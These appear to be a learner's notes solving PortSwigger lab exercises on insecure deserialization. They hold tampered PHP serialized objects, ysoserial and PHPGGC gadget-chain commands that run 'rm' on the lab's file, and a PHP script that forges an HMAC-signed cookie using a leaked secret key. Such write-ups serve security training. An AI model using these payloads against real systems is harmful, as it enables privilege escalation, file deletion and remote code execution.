## Modifying serialized objects (/admin)

1) GET /my-account request contains a session cookie that appears to be URL and Base64-encoded.
2) The `admin` attribute contains `b:0`, indicating the boolean value false. Change to `b:1`.

## Modifying serialized data types (/admin)

`O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}`

## Using application functionality to exploit insecure deserialization

1) "My account" page, notice the option to delete your account by sending a POST request to `/my-account/delete`.
2) `s:11:"avatar_link";s:23:"/home/carlos/morale.txt"` //avatar_link attribute, which contains the file path to your avatar. Change to a file.

## Arbitrary object injection in PHP

1) From the site map, notice that the website references the file `/libs/CustomTemplate.php`. Add "~" to view the code.
2) Notice the `CustomTemplate` class contains the `__destruct()` magic method. This will delete the file on this path.
3) `O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}` . Base64 and URL-encode.

## Exploiting Java deserialization with Apache Commons

This case is use standard `ysoserial`:
In Java versions 15 and below:

`java -jar ysoserial-all.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64`

https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-java-deserialization-with-apache-commons

## Exploiting PHP deserialization with a pre-built gadget chain

1) Find Cookie that can be encoded Base64 - and after - Seriliazed PHP object.
2) Notice:
   A developer comment discloses the location of a debug file at `/cgi-bin/phpinfo.php` that it leaks some key SECRETKEY;
   The error message reveals that the website is using the `Symfony 4.3.6 framework`.
3) Download the "PHPGGC" tool and execute:
```
   ./phpggc Symfony/RCE4 exec 'rm /home/carlos/morale.txt' | base64
```
4) Assign the object you generated in PHPGGC to the $object variable;
And the secret key that you copied from the phpinfo.php file to the $secretKey variable. Below.
6) Use script:

```
<?php
$object = "OBJECT-GENERATED-BY-PHPGGC";
$secretKey = "LEAKED-SECRET-KEY-FROM-PHPINFO.PHP";
$cookie = urlencode('{"token":"' . $object . '","sig_hmac_sha1":"' . hash_hmac('sha1', $object, $secretKey) . '"}');
echo $cookie;
```

## Exploiting Ruby deserialization using a documented gadget chain

1) session cookie contains a serialized ("marshaled") Ruby object;
2) Browse the web to find the Universal Deserialisation Gadget for Ruby 2.x-3.x by vakzz on devcraft.io;
3) Change the `id` to `rm /home/carlos/morale.txt`;
4) Replace the final two lines with `puts Base64.encode64(payload)`.
